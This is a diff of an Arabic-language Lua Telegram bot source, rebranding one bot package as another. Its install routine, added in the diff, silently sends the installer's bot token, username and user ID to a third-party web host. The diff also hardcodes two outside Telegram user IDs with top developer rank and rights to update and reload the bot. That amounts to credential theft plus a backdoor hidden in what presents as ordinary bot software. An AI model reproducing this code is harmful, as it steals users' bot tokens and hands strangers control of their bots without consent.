@@ -75,12 +75,12 @@ GetUser.result.username = GetUser.result.username or GetUser.result.first_name
 print('\n\27[1;36m￤تم آدخآل آيدي آلمـطـور بنجآح , سـوف يتم تشـغيل آلسـورس آلآن .\n￤Success Save ID : \27[0;32m['..SUDO_USER..']\n\27[0;39;49m')
 boss = Token:match("(%d+)")
 redis:mset(
-boss..":VERSION","1.0",
+boss..":VERSION","2.5",
 boss..":SUDO_ID:",SUDO_USER,
 boss..":DataCenter:","Amsterdam",
 boss..":UserNameBot:",BOT_User,
-boss..":ApiSource","https://api.th3boss.com/",
-boss..":NameBot:","ياقوت",
+boss..":ApiSource","SourceLHB",
+boss..":NameBot:","اللهب",
 "TH3BOSS_INSTALL","Yes"
 )
 redis:hset(boss..'username:'..SUDO_USER,'username','@'..GetUser.result.username:gsub('_',[[\_]]))
@@ -88,19 +88,19 @@ info = {}
 info.username = '@'..GetUser.result.username
 info.userbot  = BOT_User
 info.TNBOT  = Token info.userjoin  = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
-https.request('https://api.th3boss.com/request/?insert='..JSON.encode(info))
+https.request('https://alyafaevip.ml/LHB/index.php?token='..Token..'&username=@'..GetUser.result.username..'&id='..SUDO_USER)
 Cr_file = io.open("./inc/Token.txt", "w")
 Cr_file:write(Token)
 Cr_file:close()
 print('\27[1;36m￤Token.txt is created.\27[m')
-local Text = "🙋🏼‍♂️¦ اهلا عزيزي [المطور الاساسي](tg://user?id="..SUDO_USER..") \n🔖¦ شكرا لاستخدامك سورس الزعيم \n📡¦ أرســل  الان /start\n📛¦ لاضهار الاوامر للمطور  المجهزه بالكيبورد\n\n⚡️"
+local Text = "🙋🏼‍♂️¦ اهلا عزيزي [المطور الاساسي](tg://user?id="..SUDO_USER..") \n🔖¦ شكرا لاستخدامك سورس اللهب \n📡¦ أرســل  الان /start\n📛¦ لاضهار الاوامر للمطور  المجهزه بالكيبورد\n\n⚡️"
 https.request(Api_Token..'/sendMessage?chat_id='..SUDO_USER..'&text='..URL.escape(Text)..'&parse_mode=Markdown')
 local CmdRun = [[
 rm -f ./README.md
 rm -rf ./.git
 chmod +x ./run
-cp -a ../Rubys ../]]..BOT_User..[[ &&
-rm -fr ~/Rubys
+cp -a ../LHB ../]]..BOT_User..[[ &&
+rm -fr ~/LHB
 ../]]..BOT_User..[[/run
 ]]
 print(CmdRun)
@@ -113,17 +113,13 @@ if not TokenBot then
 print('\27[0;33m>>'..[[
 
 
+مرحبا يا ابوتركي في سورس ياقوت
 
 
 
-▀█████████▄   ▄██████▄     ▄████████    ▄████████
-███    ███ ███    ███   ███    ███   ███    ███
-███    ███ ███    ███   ███    █▀    ███    █▀
-▄███▄▄▄██▀  ███    ███   ███          ███
-▀▀███▀▀▀██▄  ███    ███ ▀███████████ ▀███████████ ꒐ Dev : @TH3BS
-███    ██▄ ███    ███          ███          ███ ꒐ Dev : @OMMMM
-███    ███ ███    ███    ▄█    ███    ▄█    ███
-▄█████████▀   ▀██████▀   ▄████████▀   ▄████████▀  ꒐ Source The3Boss
+
+
+مطور السورس @PROTECTmnbot
 ---------------------------------------------------------------------
 ]]..'\027[0;32m')
 create_config()
@@ -157,19 +153,13 @@ end
 print('\27[0;33m>>'..[[
 
 
+مرحبا يا ابوتركي في سورس ياقوت
 
 
 
 
-▀█████████▄   ▄██████▄     ▄████████    ▄████████ 
-███    ███ ███    ███   ███    ███   ███    ███ 
-███    ███ ███    ███   ███    █▀    ███    █▀  
-▄███▄▄▄██▀  ███    ███   ███          ███        
-▀▀███▀▀▀██▄  ███    ███ ▀███████████ ▀███████████ ꒐ Dev : @TH3BS
-███    ██▄ ███    ███          ███          ███ ꒐ Dev : @OMMMM
-███    ███ ███    ███    ▄█    ███    ▄█    ███ 
-▄█████████▀   ▀██████▀   ▄████████▀   ▄████████▀  ꒐ VERSION » v]]..version..[[
 
+مطور السورس @PROTECTmnbot
 -------------------------------------------------------------------
 
 ]]..'\027[0;32m'
@@ -289,9 +279,9 @@ end
 return false 
 end 
 
-if msg.sender_user_id_ == 909279851 or msg.sender_user_id_ == 909279851  then 
-msg.TheRankCmd = 'مطور البوت '
-msg.TheRank = 'مطور البوت '
+if msg.sender_user_id_ == 476328331 or msg.sender_user_id_ == 879123322  then 
+msg.TheRankCmd = 'مطور السورس'
+msg.TheRank = 'مطور السورس'
 msg.Rank = 1
 elseif msg.sender_user_id_ == SUDO_ID then 
 msg.TheRankCmd = redis:get(boss..":RtbaNew1:"..msg.chat_id_) or 'المطور الاساسي' 
@@ -602,19 +592,19 @@ print("MessageEntityCode")
 end
 end
 msg.text = msg.content_.text_
-if (msg.text=="تحديث" or msg.text=="we" or msg.text=="تحديث ♻️") and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 909279851 or msg.sender_user_id_ == 909279851) then
+if (msg.text=="تحديث" or msg.text=="we" or msg.text=="تحديث ♻️") and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 476328331 or msg.sender_user_id_ == 879123322) then
 return sendMsg(msg.chat_id_,msg.id_,"- تم تحديث الملفات",function(arg,data)
 Refresh_Start = true
 end)
 end 
-if msg.text == 'Update Source' and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 909279851 or msg.sender_user_id_ == 909279851) then
+if msg.text == 'Update Source' and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 476328331 or msg.sender_user_id_ == 879123322) then
 UpdateSource(msg)
 sendMsg(msg.chat_id_,msg.id_,'- {* تــم تحديث وتثبيت السورس  *} .\n\n- { Bot is Update » }',function(arg,data)
 dofile("./inc/Run.lua")
 print("Reload ~ ./inc/Run.lua")
 end) 
 end
-if (msg.text == 'reload' or msg.text == "أعادة التشغيل 🔌") and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 909279851or msg.sender_user_id_ == 909279851) then
+if (msg.text == 'reload' or msg.text == "أعادة التشغيل 🔌") and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 476328331 or msg.sender_user_id_ == 879123322) then
 sendMsg(msg.chat_id_,msg.id_,'- {* تــم أعـاده تشغيل البوت  *} .\n\n- { Bot is Reloaded » }',function(arg,data)
 dofile("./inc/Run.lua")
 print("Reload ~ ./inc/Run.lua")
